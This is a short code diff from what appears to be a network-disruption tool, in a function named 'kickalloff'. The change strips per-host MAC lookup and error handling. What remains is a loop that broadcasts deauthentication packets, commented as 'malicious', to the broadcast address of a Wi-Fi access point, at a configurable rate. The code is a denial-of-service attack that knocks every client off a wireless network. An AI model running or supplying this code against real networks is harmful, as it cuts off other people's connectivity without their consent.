@@ -583,11 +583,6 @@ def kickalloff():
         try:
             while True:
                 # broadcast malicious DEAUTH packets
-                ipAddress = i
-                macAddress = retrieveMACAddress(ipAddress)
-                if macAddress == False:
-                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
-                    raise SystemExit
                 spoof.sendDeauthPacket(iface, bssid, 'FF:FF:FF:FF:FF:FF')
                 if options.packets is not None:
                     time.sleep(60/options.packets)
